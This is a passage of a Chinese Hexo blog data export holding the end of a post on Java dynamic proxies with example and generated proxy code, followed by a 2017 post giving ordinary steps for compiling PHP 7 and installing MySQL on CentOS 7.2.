class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Jack</span> <span class=\"keyword\">implements</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                Thread.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"我是jack，我正在跑\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">jump</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"我是jack，我正在跳\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>让jack来实现这个接口，现在我们来统计jack的运行时间。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> Person jack = <span class=\"keyword\">new</span> Jack();</span><br><span class=\"line\">       Person jackPrxoxy = (Person) Proxy.newProxyInstance(Jack.class.getClassLoader(), new Class&lt;?&gt;[]&#123;Person.class&#125;, new InvocationHandler() &#123;</span><br><span class=\"line\">           <span class=\"meta\">@Override</span></span><br><span class=\"line\">           <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">invoke</span><span class=\"params\">(Object proxy, Method method, Object[] args)</span> <span class=\"keyword\">throws</span> Throwable </span>&#123;</span><br><span class=\"line\">               <span class=\"keyword\">long</span> time = System.currentTimeMillis();</span><br><span class=\"line\">               method.invoke(jack, args);</span><br><span class=\"line\">               System.out.println(<span class=\"string\">\"调用\"</span> + method.getName() + <span class=\"string\">\"方法，耗时：\"</span> + (System.currentTimeMillis() - time));</span><br><span class=\"line\">               <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;);</span><br><span class=\"line\">       jackPrxoxy.run();</span><br><span class=\"line\">       jackPrxoxy.jump();</span><br></pre></td></tr></table></figure>\n\n<p>最终得到的结果是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">我是jack，我正在跑</span><br><span class=\"line\">调用run方法，耗时：101</span><br><span class=\"line\">我是jack，我正在跳</span><br><span class=\"line\">调用jump方法，耗时：0</span><br></pre></td></tr></table></figure>\n<p>通过上面简单的代码，我们已经实现了我们最初的需求，那么我们来分析，分析背后的原理。<br>通过查看源码可知，Proxy.newProxyInstance这个类会动态生成一个java的class类，然后动态生成的这个class类，将被实例化，供我们调用。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">byte</span>[] classFile = ProxyGenerator.generateProxyClass(<span class=\"string\">\"$Proxy0\"</span>,<span class=\"keyword\">new</span> Class&lt;?&gt;[]&#123;Person<span class=\"class\">.<span class=\"keyword\">class</span>&#125;)</span>;</span><br><span class=\"line\">       String path = <span class=\"string\">\"./StuProxy.class\"</span>;</span><br><span class=\"line\">       <span class=\"keyword\">try</span>(FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(path)) &#123;</span><br><span class=\"line\">           fos.write(classFile);</span><br><span class=\"line\">           fos.flush();</span><br><span class=\"line\">           System.out.println(<span class=\"string\">\"代理类class文件写入成功\"</span>);</span><br><span class=\"line\">       &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">           System.out.println(<span class=\"string\">\"写文件错误\"</span>);</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure>\n<p>可通过这个代码，去保存生成的类。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> $<span class=\"title\">Proxy0</span> <span class=\"keyword\">extends</span> <span class=\"title\">Proxy</span> <span class=\"keyword\">implements</span> <span class=\"title\">Person</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m1;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m3;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m2;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m4;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Method m0;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> $Proxy0(InvocationHandler var1) <span class=\"keyword\">throws</span>  &#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(var1);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">boolean</span> <span class=\"title\">equals</span><span class=\"params\">(Object var1)</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Boolean)<span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m1, <span class=\"keyword\">new</span> Object[]&#123;var1&#125;);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var3;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var4) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var4);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m3, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> String <span class=\"title\">toString</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (String)<span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m2, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title\">jump</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m4, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> <span class=\"title\">hashCode</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (Integer)<span class=\"keyword\">super</span>.h.invoke(<span class=\"keyword\">this</span>, m0, (Object[])<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (RuntimeException | Error var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> var2;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UndeclaredThrowableException(var3);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            m1 = Class.forName(<span class=\"string\">\"java.lang.Object\"</span>).getMethod(<span class=\"string\">\"equals\"</span>, Class.forName(<span class=\"string\">\"java.lang.Object\"</span>));</span><br><span class=\"line\">            m3 = Class.forName(<span class=\"string\">\"proxy.Person\"</span>).getMethod(<span class=\"string\">\"run\"</span>);</span><br><span class=\"line\">            m2 = Class.forName(<span class=\"string\">\"java.lang.Object\"</span>).getMethod(<span class=\"string\">\"toString\"</span>);</span><br><span class=\"line\">            m4 = Class.forName(<span class=\"string\">\"proxy.Person\"</span>).getMethod(<span class=\"string\">\"jump\"</span>);</span><br><span class=\"line\">            m0 = Class.forName(<span class=\"string\">\"java.lang.Object\"</span>).getMethod(<span class=\"string\">\"hashCode\"</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var2) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoSuchMethodError(var2.getMessage());</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException var3) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> NoClassDefFoundError(var3.getMessage());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从上面的代码可以清晰的看出来，我们调用的方法最终都被代理给了InvocationHandler，我们在InvocationHandler又反射调用被代理的对象，最终实现整个代理过程。</p>\n"},{"title":"阿里云centos 7.2编译安装php+nginx+mysql","date":"2017-08-15T14:22:04.000Z","_content":"### 1.安装必要的库\n\n```\nyum -y install libxml2 libxml2-devel openssl openssl-devel curl-devel libjpeg-devel libpng-devel freetype-devel libmcrypt-devel\n```\n\n### 2.下载php源码\n\n```\ncurl -O http://cn2.php.net/distributions/php-7.0.21.tar.gz\n\ntar -zxvf php-7.0.21.tar.gz\n```\n\n### 3.安装php\n\n```\n./configure --prefix=/usr/local/php7 --exec-prefix=/usr/local/php7 --bindir=/usr/local/php7/bin --sbindir=/usr/local/php7/sbin --includedir=/usr/local/php7/include --libdir=/usr/local/php7/lib/php --mandir=/usr/local/php7/php/man --with-config-file-path=/usr/local/php7/etc --with-mysql-sock=/var/lib/mysql/mysql.sock --with-mcrypt=/usr/include --with-mhash--with-openssl --with-mysqli=shared,mysqlnd --with-pdo-mysql=shared,mysqlnd --with-gd --with-iconv --with-zlib --enable-zip --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-xml --enable-bcmath --enable-shmop --enable-sysvsem --enable-mbregex --enable-mbstring --enable-ftp --enable-gd-native-ttf --enable-pcntl --enable-sockets --with-xmlrpc --enable-soap --without-pear --with-gettext --enable-session --with-curl --with-openssl --with-jpeg-dir --with-freetype-dir --enable-opcache --enable-fpm --with-fpm-user=nginx --with-fpm-group=nginx --without-gdbm --enable-fileinfo\n```\n\n执行安装\n\n```\nmake clean && make && make install\n```\n\n开始设置PHP7的配置文件php.ini、php-fpm.conf、www.conf和php-fpm脚本\n\n```\ncp php.ini-production /usr/local/php7/etc/php.ini\n\ncp /root/php-7.0.0/sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n\ncp /usr/local/php7/etc/php-fpm.conf.default /usr/local/php7/etc/php-fpm.conf\n\ncp /usr/local/php7/etc/php-fpm.d/www.conf.default /usr/local/php7/etc/php-fpm.d/www.conf\n```\n\n执行php-fpm启动php-fpm\n\n### 4.安装mysql数据库\n\n下载 MySQL Yum Repository\n\n```\nwget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\n```\n\n添加 MySQL Yum Repository\n\n添加 MySQL Yum Repository 到你的系统 repository 列表中，执行\n\n```\nyum local install mysql-community-release-el7-5.noarch.rpm\n\nyum install  mysql-community-server\n```\n\n启动mysql\n\n```\nsystemctl start mysqld\n```\n\n设置mysql密码\n\n```\n/usr/bin/mysqladmin -u root password 'passwd'\n```\n","source":"_posts/2017-08-02.md","raw":"---\ntitle: '阿里云centos 7.2编译安装php+nginx+mysql'\ndate: 2017-08-15 22:22:04\ntags: php\n---\n### 1.安装必要的库\n\n```\nyum -y install libxml2 libxml2-devel openssl openssl-devel curl-devel libjpeg-devel libpng-devel freetype-devel libmcrypt-devel\n```\n\n### 2.下载php源码\n\n```\ncurl -O http://cn2.php.net/distributions/php-7.0.21.tar.gz\n\ntar -zxvf php-7.0.21.tar.gz\n```\n\n### 3.安装php\n\n```\n./configure --prefix=/usr/local/php7 --exec-prefix=/usr/local/php7 --bindir=/usr/local/php7/bin --sbindir=/usr/local/php7/sbin --includedir=/usr/local/php7/include --libdir=/usr/local/php7/lib/php --mandir=/usr/local/php7/php/man --with-config-file-path=/usr/local/php7/etc --with-mysql-sock=/var/lib/mysql/mysql.sock --with-mcrypt=/usr/include --with-mhash--with-openssl --with-mysqli=shared,mysqlnd --with-pdo-mysql=shared,mysqlnd --with-gd --with-iconv --with-zlib --enable-zip --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-xml --enable-bcmath --enable-shmop --enable-sysvsem --enable-mbregex --enable-mbstring --enable-ftp --enable-gd-native-ttf --enable-pcntl --enable-sockets --with-xmlrpc --enable-soap --without-pear --with-gettext --enable-session --with-curl --with-openssl --with-jpeg-dir --with-freetype-dir --enable-opcache --enable-fpm --with-fpm-user=nginx --with-fpm-group=nginx --without-gdbm --enable-fileinfo\n```\n\n执行安装\n\n```\nmake clean && make && make install\n```\n\n开始设置PHP7的配置文件php.ini、php-fpm.conf、www.conf和php-fpm脚本\n\n```\ncp php.ini-production /usr/local/php7/etc/php.ini\n\ncp /root/php-7.0.0/sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm\n\ncp /usr/local/php7/etc/php-fpm.conf.default /usr/local/php7/etc/php-fpm.conf\n\ncp /usr/local/php7/etc/php-fpm.d/www.conf.default /usr/local/php7/etc/php-fpm.d/www.conf\n```\n\n执行php-fpm启动php-fpm\n\n### 4.安装mysql数据库\n\n下载 MySQL Yum Repository\n\n```\nwget http://dev.mysql.com/get/mysql-community-release-el7-5.noarch.rpm\n```\n\n添加 MySQL Yum Repository\n\n添加 MySQL Yum Repository 到你的系统 repository 列表中，执行\n\n```\nyum local install mysql-community-release-el7-5.noarch.rpm\n\nyum install  mysql-community-server\n```\n\n启动mysql\n\n```\nsystemctl start mysqld\n```\n\n设置mysql密码\n\n```\n/usr/bin/mysqladmin -u root password 'passwd'\n```\n","slug":"2017-08-02","published":1,"updated":"2017-08-15T14:45:38.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckox55gc60001ak9c30zz7lue","content":"<h3 id=\"1-安装必要的库\"><a href=\"#1-安装必要的库\" class=\"headerlink\" title=\"1.安装必要的库\"></a>1.安装必要的库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum -y install libxml2 libxml2-devel openssl openssl-devel curl-devel libjpeg-devel libpng-devel freetype-devel libmcrypt-devel</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-下载php源码\"><a href=\"#2-下载php源码\" class=\"headerlink\" title=\"2.下载php源码\"></a>2.下载php源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -O http:&#x2F;&#x2F;cn2.php.net&#x2F;distributions&#x2F;php-7.0.21.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar -zxvf php-7.0.21.tar.gz</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-安装php\"><a href=\"#3-安装php\" class=\"headerlink\" title=\"3.安装php\"></a>3.安装php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php7 --exec-prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php7 --bindir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;bin --sbindir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;sbin --includedir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;include --libdir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;lib&#x2F;php --mandir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;php&#x2F;man --with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc --with-mysql-sock&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock --with-mcrypt&#x3D;&#x2F;usr&#x2F;include --with-mhash--with-openssl --with-mysqli&#x3D;shared,mysqlnd --with-pdo-mysql&#x3D;shared,mysqlnd --with-gd --with-iconv --with-zlib --enable-zip --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-xml --enable-bcmath --enable-shmop --enable-sysvsem --enable-mbregex --enable-mbstring --enable-ftp --enable-gd-native-ttf --enable-pcntl --enable-sockets --with-xmlrpc --enable-soap --without-pear --with-gettext --enable-session --with-curl --with-openssl --with-jpeg-dir --with-freetype-dir --enable-opcache --enable-fpm --with-fpm-user&#x3D;nginx --with-fpm-group&#x3D;nginx --without-gdbm --enable-fileinfo</span><br></pre></td></tr></table></figure>\n\n<p>执行安装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make clean &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<p>开始设置PHP7的配置文件php.ini、php-fpm.conf、<a href=\"http://www.conf和php-fpm脚本\" target=\"_blank\" rel=\"noopener\">www.conf和php-fpm脚本</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp php.ini-production &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php.ini</span><br><span class=\"line\"></span><br><span class=\"line\">cp &#x2F;root&#x2F;php-7.0.0&#x2F;sapi&#x2F;fpm&#x2F;init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</span><br><span class=\"line\"></span><br><span class=\"line\">cp &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.conf.default &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.conf</span><br><span class=\"line\"></span><br><span class=\"line\">cp &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf.default &#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conf</span><br></pre></td></tr></table></figure>\n\n<p>执行php-fpm启动php-fpm</p>\n<h3 id=\"4-安装mysql数据库\"><a href=\"#4-安装mysql数据库\" class=\"headerlink\" title=\"4.安装mysql数据库\"></a>4.安装mysql数据库</h3><p>下载 MySQL Yum Repository</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:&#x2F;&#x2F;dev.mysql.com&#x2F;get&#x2F;mysql-community-release-el7-5.noarch.rpm</span><br></pre></td></tr></table></figure>\n\n<p>添加 MySQL Yum Repository</p>\n<p>添加 MySQL Yum Repository 到你的系统 repository 列表中，执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum local install mysql-community-release-el7-5.noarch.rpm</span><br><span class=\"line\"></span><br><span class=\"line\">yum install  mysql-community-server</span><br></pre></td></tr></table></figure>\n\n<p>启动mysql</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl start mysqld</span><br></pre></td></tr></table></figure>\n\n<p>设置mysql密码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;usr&#x2F;bin&#x2F;mysqladmin -u root password &#39;passwd&#39;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-安装必要的库\"><a href=\"#1-安装必要的库\" class=\"headerlink\" title=\"1.安装必要的库\"></a>1.安装必要的库</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum -y install libxml2 libxml2-devel openssl openssl-devel curl-devel libjpeg-devel libpng-devel freetype-devel libmcrypt-devel</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-下载php源码\"><a href=\"#2-下载php源码\" class=\"headerlink\" title=\"2.下载php源码\"></a>2.下载php源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -O http:&#x2F;&#x2F;cn2.php.net&#x2F;distributions&#x2F;php-7.0.21.tar.gz</span><br><span class=\"line\"></span><br><span class=\"line\">tar -zxvf php-7.0.21.tar.gz</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-安装php\"><a href=\"#3-安装php\" class=\"headerlink\" title=\"3.安装php\"></a>3.安装php</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php7 --exec-prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php7 --bindir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;bin --sbindir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;sbin --includedir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;include --libdir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;lib&#x2F;php --mandir&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;php&#x2F;man --with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php7&#x2F;etc --with-mysql-sock&#x3D;&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock --with-mcrypt&#x3D;&#x2F;usr&#x2F;include --with-mhash--with-openssl --with-mysqli&#x3D;shared,mysqlnd --with-pdo-mysql&#x3D;shared,mysqlnd --with-gd --with-iconv --with-zlib --enable-zip --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-xml --enable-bcmath --enable-shmop --enable-sysvsem --enable-mbregex --enable-mbstring --enable-ftp --enable-gd-native-ttf --enable-pcntl --enable-sockets --with-xmlrpc --enable-soap --without-pear --with-gettext --enable-session --with-curl --with-openssl --with-jpeg-dir --with-freetype-dir --enable-opcache --enable-fpm --with-fpm-user&#x3D;nginx --with-fpm-group&#x3D;nginx --without-gdbm --enable-fileinfo</span><br></pre></td></tr></table></figure>\n\n<p>执行安装</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">make clean &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<p>开始设置PHP7的配置文件php.ini、php-fpm.conf、<a href=\"http://www.conf和php-fpm脚本\" target=\"_blank\" rel=\"noopener\">www.conf和php-fpm脚本</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp php.ini-production 